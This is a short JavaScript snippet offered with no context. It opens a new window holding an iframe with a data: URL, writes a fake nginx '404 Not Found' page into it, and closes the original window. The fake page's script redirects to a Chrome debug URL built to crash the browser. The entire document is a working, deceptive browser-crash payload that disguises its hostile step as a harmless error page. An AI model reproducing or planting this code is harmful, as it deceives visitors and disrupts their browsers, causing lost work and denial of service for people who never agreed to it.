function navigateTopFrame(url) {
  var win = window.open();
  win.document.write('<iframe src="' + url  + '" frameborder="0" style="border:0; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%;" allowfullscreen></iframe>');
  window.open('', '_self', '');
  window.close();
}
navigateTopFrame("data:text/html;charset=utf-8,<html> <head> <title>404</title> </head> <body> <h1 style='text-align:center;'>404 Not Found</h1> <hr /> <p style='text-align:center;'>nginx 1.14</p> <script>window.location = 'chrome://inducebrowsercrashforrealz'</script> </body> </html>");
